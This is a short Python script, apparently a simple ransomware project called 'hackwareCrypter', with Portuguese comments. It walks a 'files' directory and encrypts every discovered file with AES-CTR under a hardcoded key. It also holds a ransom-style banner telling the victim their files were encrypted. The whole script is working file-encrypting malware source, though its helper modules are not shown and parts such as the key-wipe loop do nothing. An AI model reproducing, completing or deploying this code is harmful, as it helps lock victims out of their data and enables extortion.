# -*- coding utf-8 -*-

from Crypto.Cipher import AES
from Crypto.Util import Counter
import argparse
import crip
import os
import discovery

#### tamanho senha --------
# 128/192/1256 bits

HARDCODED_KEY = 'hackware strike force strikes u!'

def get_parser():
    parser = argparse.ArgumentParser(description="hackwareCrypter")
    parser.add_argument('-d', '--decrypt', help='decripta os arquivos [defauult:no]', action='store_true')
    return parser

def main():
    parser = get_parser()
    args = vars(parser.parse_args())
    decrypt = args['decrypt']

    if decrypt:
        print('''
        HACKWARE STRIKE FORCE
        ---------------------------------
        SEUS ARQUIVOS FORAM CRIPTOGRAFADOS.
        PARA DECRIPTA-LO UTILIZE A SEGUINTE SENHA '{}'
        '''.format(HARDCODED_KEY))

        key = input('Digite a senha: ')
    else:
        if HARDCODED_KEY:
            key = HARDCODED_KEY

    ctr = Counter.new(128)
    crypt = AES.new(key, AES.MODE_CTR, counter = ctr)

    if not decrypt:
        cryptFn = crypt.encrypt
    else:
        cryptFn = crypt.decrypt

    init_path = os.path.abspath(os.path.join(os.getcwd(), 'files'))

    starsDirs = [init_path]

    for currentDir in starsDirs:
        for filename in discovery.discover(currentDir):
            crip.change(filename, cryptFn)

    #limpa chave

    for _ in range(100):
        pass

    if not decrypt:
        pass

if __name__ == '__main__':
    main()